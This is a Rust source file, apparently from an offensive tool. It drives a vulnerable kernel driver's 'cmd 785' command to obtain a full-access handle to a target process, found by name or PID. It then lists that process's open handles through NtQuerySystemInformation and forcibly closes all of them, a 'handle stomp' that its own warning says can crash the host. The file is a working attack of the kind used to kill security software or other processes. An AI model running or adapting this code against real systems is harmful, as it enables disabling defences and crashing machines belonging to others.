use std::ffi::c_void;

use windows::{
    core::s,
    Win32::{
        Foundation::CloseHandle,
        System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
};

use crate::proc;

const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC0000004;
const SYSTEM_EXTENDED_HANDLE_INFORMATION: u32 = 0x40;

pub fn run(target: &str, device: &str) -> Result<(), String> {
    let pid = match target.parse::<u32>() {
        Ok(n) if n != 0 => n,
        _ => proc::find_pid(target)?,
    };
    println!("[+] Target PID ............ {pid} ({target})");

    let driver = crate::open_driver(device)?;

    let target_handle = driver.open_process(pid)
        .map_err(|e| format!("cmd 785 against PID {pid}: {e}"))?;
    println!(
        "[+] Target handle ......... 0x{:X} (cmd 785 kernel-minted PROCESS_ALL_ACCESS)",
        target_handle.0 as u64,
    );

    println!("[!] WARNING: closing kernel objects in the target can BSOD the host.");

    let handles = enumerate_process_handles(pid)?;
    if handles.is_empty() {
        unsafe { let _ = CloseHandle(target_handle); }
        return Err(format!("no handles enumerated for PID {pid}"));
    }
    println!("[+] Target has {} open handles", handles.len());

    let (mut ok, mut fail) = (0usize, 0usize);
    for &h in &handles {
        match driver.close_remote_handle(target_handle, h) {
            Ok(()) => ok += 1,
            Err(_) => fail += 1,
        }
    }
    println!("[+] Handle stomp: closed {ok}, refused {fail} (of {})", handles.len());

    unsafe { let _ = CloseHandle(target_handle); }
    Ok(())
}

fn enumerate_process_handles(target_pid: u32) -> Result<Vec<u64>, String> {
    type NtQsiFn = unsafe extern "system" fn(u32, *mut c_void, u32, *mut u32) -> i32;

    unsafe {
        let ntdll = GetModuleHandleA(s!("ntdll.dll"))
            .map_err(|e| format!("GetModuleHandleA(ntdll): {e}"))?;
        let proc_addr = GetProcAddress(ntdll, s!("NtQuerySystemInformation"))
            .ok_or_else(|| "NtQuerySystemInformation not exported".to_string())?;
        let nt_qsi: NtQsiFn = std::mem::transmute(proc_addr);

        let mut size: u32 = 0x10_0000;
        let mut buf: Vec<u8> = vec![0u8; size as usize];
        loop {
            let mut needed = 0u32;
            let status = nt_qsi(
                SYSTEM_EXTENDED_HANDLE_INFORMATION,
                buf.as_mut_ptr() as _,
                size,
                &mut needed,
            );
            if status == 0 { break; }
            if status as u32 == STATUS_INFO_LENGTH_MISMATCH {
                size = needed.saturating_add(0x10_000).max(size.saturating_mul(2));
                buf = vec![0u8; size as usize];
                continue;
            }
            return Err(format!("NtQuerySystemInformation: 0x{:08X}", status as u32));
        }

        let count = usize::from_le_bytes(buf[..8].try_into().unwrap());
        const ENTRY_SIZE: usize = 40;
        let mut out = Vec::new();
        for i in 0..count {
            let off = 0x10 + i * ENTRY_SIZE;
            if off + ENTRY_SIZE > buf.len() { break; }
            let pid = usize::from_le_bytes(buf[off + 8..off + 16].try_into().unwrap()) as u32;
            if pid != target_pid { continue; }
            let handle = u64::from_le_bytes(buf[off + 16..off + 24].try_into().unwrap());
            out.push(handle);
        }
        Ok(out)
    }
}
